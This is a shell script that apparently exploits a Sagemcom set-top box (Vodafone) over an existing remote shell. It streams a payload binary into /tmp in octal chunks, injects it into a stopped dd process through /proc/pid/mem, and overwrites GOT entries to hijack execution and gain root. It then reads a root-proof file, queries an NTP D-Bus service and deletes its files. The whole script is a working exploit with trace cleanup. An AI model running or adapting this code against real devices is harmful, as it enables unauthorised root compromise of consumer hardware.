#!/bin/sh
set -eu

host="${1:-192.168.100.11}"
port="${2:-9536}"
image="scnet_ntp_dbus_probe.bin"
bootstrap="scnet-ddexec-bootstrap.bin"

test "$(wc -c <"$image")" -eq 15384
test "$(wc -c <"$bootstrap")" -eq 36

octal=$(od -An -v -to1 "$image" | tr -s ' ' '\n' | sed '/^$/d;s/^/\\/' | tr -d '\n')
boot_octal=$(od -An -v -to1 "$bootstrap" | tr -s ' ' '\n' | sed '/^$/d;s/^/\\/' | tr -d '\n')

{
    sleep 3
    printf ': >/tmp/scnet_probe.bin; /bin/busybox rm -f /tmp/scnet_probe.log /tmp/scnet_reply.bin /tmp/scnet-root-proof\n'
    printf '%s\n' "$octal" | fold -w 768 | while IFS= read -r chunk; do
        printf "printf '%s' >>/tmp/scnet_probe.bin\n" "$chunk"
    done
    printf "printf '%s' >/tmp/scnet_probe_bootstrap.bin\n" "$boot_octal"
    printf '%s\n' '/bin/dd if=/dev/zero of=/dev/null bs=4096 & p=$!; /bin/sleep 1; kill -STOP $p; base=$(/usr/bin/awk '\''$6=="/bin/busybox"&&$3=="00000000"{split($1,a,"-");print a[1];exit}'\'' /proc/$p/maps); image=$((0x$base+0x74000)); rgot=$((0x$base+0x8fb08)); wgot=$((0x$base+0x8fdf4)); echo TARGET=$p BASE=$base IMAGE=$image; /bin/dd if=/tmp/scnet_probe.bin of=/proc/$p/mem bs=1 seek=$image conv=notrunc; rc1=$?; /bin/dd if=/tmp/scnet_probe_bootstrap.bin of=/proc/$p/mem bs=1 seek=$image conv=notrunc; rcb=$?; printf "\\$(printf %03o $((image&255)))\\$(printf %03o $(((image>>8)&255)))\\$(printf %03o $(((image>>16)&255)))\\$(printf %03o $(((image>>24)&255)))" >/tmp/scnet_probe_pointer.bin; /bin/dd if=/tmp/scnet_probe_pointer.bin of=/proc/$p/mem bs=1 seek=$rgot conv=notrunc; rc2=$?; /bin/dd if=/tmp/scnet_probe_pointer.bin of=/proc/$p/mem bs=1 seek=$wgot conv=notrunc; rc3=$?; echo IMAGE_RC=$rc1 BOOT_RC=$rcb READ_GOT_RC=$rc2 WRITE_GOT_RC=$rc3; kill -CONT $p; /bin/sleep 8; echo PROBE_LOG; /bin/cat /tmp/scnet_probe.log 2>&1; echo ROOT_PROOF; /bin/ls -l /tmp/scnet-root-proof 2>&1; /bin/cat /tmp/scnet-root-proof 2>&1; echo NTP_LIST; /usr/bin/dbus-send --bus=unix:path=/tmp/sc_bus/sc_bus --print-reply --reply-timeout=3000 --dest=com.sagemcom.stb.network /com/sagemcom/stb/network com.sagemcom.stb.network.NTP_GetList 2>&1; kill -KILL $p 2>/dev/null || true; /bin/busybox rm -f /tmp/scnet_probe.bin /tmp/scnet_probe_bootstrap.bin /tmp/scnet_probe_pointer.bin; echo SCNET_PROBE_DONE'
    sleep 12
} | timeout 35 ./vodafone-direct-shell.sh "$host" "$port"
